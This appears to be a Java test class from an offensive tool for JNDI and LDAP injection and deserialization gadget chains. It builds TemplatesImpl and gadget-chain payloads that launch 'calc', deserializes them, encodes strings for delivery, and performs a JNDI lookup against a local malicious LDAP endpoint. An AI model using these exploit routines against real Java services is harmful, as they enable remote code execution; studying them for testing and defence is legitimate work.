package com.idiot9.tmp;

import com.idiot9.ldap.enumtypes.EncodingTypes;
import com.idiot9.ldap.gadgets.GadgetFactory;
import com.idiot9.ldap.gadgets.utils.Reflections;
import com.idiot9.ldap.gadgets.utils.TemplatesCreator;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Test {
    public static void main(String[] args) throws Exception {

    }

    public Test() {
        System.out.println("non param constructor");
        test();
    }

    public void test(){
        System.out.println("just test");
    }

    public static void TemplTest() throws Exception {
        Templates templates = (Templates) TemplatesCreator.createTemplatesImpl("calc");
        templates.getOutputProperties();
    }

    public static void gadgetTest(String gadget) throws Exception {
        Class<? extends GadgetFactory> gadgetClass = GadgetFactory.Utils.getGadgetClass(gadget);
        Object gadgetObject = GadgetFactory.Utils.getGadgetObject(gadgetClass, "calc", null, null);
        byte[] ser = Reflections.ser(gadgetObject);
        Reflections.deser(ser);
    }

    public static void encode(String s){
        String s1 = Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
        String s2 = URLEncoder.encode(s1);
        System.out.println(s2);
    }

    public static void lookup() throws NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://127.0.0.1:1389/Basic/Command/calc");
    }
}
